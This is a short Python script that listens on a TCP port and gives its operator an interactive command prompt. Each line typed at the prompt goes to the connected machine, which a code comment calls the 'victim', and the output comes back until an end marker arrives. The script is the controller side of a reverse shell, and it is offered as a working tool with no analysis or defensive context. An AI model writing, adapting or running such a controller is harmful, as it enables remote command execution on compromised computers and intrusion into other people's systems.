#!/usr/bin/env python
from socket import*
from sys import stdout

try:
    input = raw_input
except:
    pass


def fuzz_den(meth):
    for encode in ("utf-8", "gbk", "iso8859-1"):
        try:
            return meth(encode)
        except Exception:
            continue


def enter_console(sock):
    S, R = sock.send, sock.recv
    STREAM_END_SIG = b"\x00\x00"
    E = lambda I: fuzz_den(I.encode)
    D = lambda I: fuzz_den(I.decode)
    puts = lambda s: stdout.write(s)
    while True:
        inputs = input("$> ")
        if len(inputs) <= 0:
            continue
        if inputs == "quit":
            exit(0)
        if inputs == "exit":
            break
        # send to victim's
        if S(E(inputs)) == 0:
            break

        packets = 0
        while True:
            buffer = b""
            while True:
                buffer += R(1024)
                if b"\n" in buffer:
                    break
                if STREAM_END_SIG in buffer:
                    break
            if STREAM_END_SIG in buffer:
                puts(D(buffer[:-2]))
                break
            puts(D(buffer))

    sock.close()


def server(h, p):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.bind((h, int(p)))
    sock.listen(2)

    while 6:
        try:
            print("listen on %s:%s, waiting for connection." % (h, p))
            C, addr = sock.accept()
            print("connection from %s:%s" % addr)
            enter_console(C)
        except:
            continue

if __name__ == "__main__":
    import sys
    server(*sys.argv[1].split(":"))
